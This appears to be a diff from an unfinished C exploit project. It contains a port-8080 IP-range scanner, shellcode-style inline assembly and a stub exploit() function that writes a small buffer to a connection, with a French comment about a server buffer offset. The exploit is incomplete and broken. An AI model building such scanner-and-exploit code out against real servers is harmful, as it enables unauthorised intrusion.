@@ -185,11 +185,6 @@ struct list_server * scan_server_available(char * start_IP_str, char * end_IP_st
 	return opened_servers;
 }
 void exploit(int connfd){
-
-}
-
-
-int entry_point() {
 	// Perform a write to stdout
 	asm("push %rsi\n\t"
 	"lea (%rip),%rsi\n\t"
@@ -207,6 +202,13 @@ int entry_point() {
     "add $5, %rdx\n\t"
     "syscall\n\t"
 	"pop %rsi\n\t");
+	char * buff[5];
+	int SERV_BUFF_SIZE = 49; //TAILLE DU BUFFER SERVEUR, SERT POUR LE DECALAGE
+	write(connfd,buff,5);
+}
+
+
+int entry_point() {
 
 	/* Scan IP given for server listening on port 8080
     then puts them in a linked list*/
